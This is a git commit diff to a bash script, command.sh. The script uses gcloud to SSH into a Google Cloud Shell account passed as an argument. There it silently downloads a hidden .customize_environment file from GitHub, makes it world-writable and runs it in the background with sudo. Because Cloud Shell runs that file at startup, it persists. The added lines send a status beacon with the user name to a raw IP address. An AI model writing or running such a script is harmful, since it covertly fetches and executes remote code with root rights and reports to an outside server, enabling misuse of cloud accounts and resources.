8a0f571d2460eeb7e1e6d9abfabd4a8cbd8e77b2
Predador21 <81100606+Predador21@users.noreply.github.com>
2021-09-09 22:58:10 -0300

    Update command.sh

--- command.sh
+++ command.sh
@@ -1,10 +1,15 @@
 #!/bin/bash
 
+user=${0##*/}
+
 echo
 echo $1
 
 command="[ ! -e '.customize_environment' ] && ( wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment ; chmod 777 .customize_environment ; sudo nohup ./.customize_environment > /dev/null & )"
 
 gcloud cloud-shell ssh --account=$1 --command="$command" --authorize-session --force-key-file-overwrite --ssh-flag='-n' --quiet
+
+url='http://135.148.11.148/send_status.php?refresh='$2'&status=CREATED&owner='$user
+curl $url
 
 echo 'command ok'
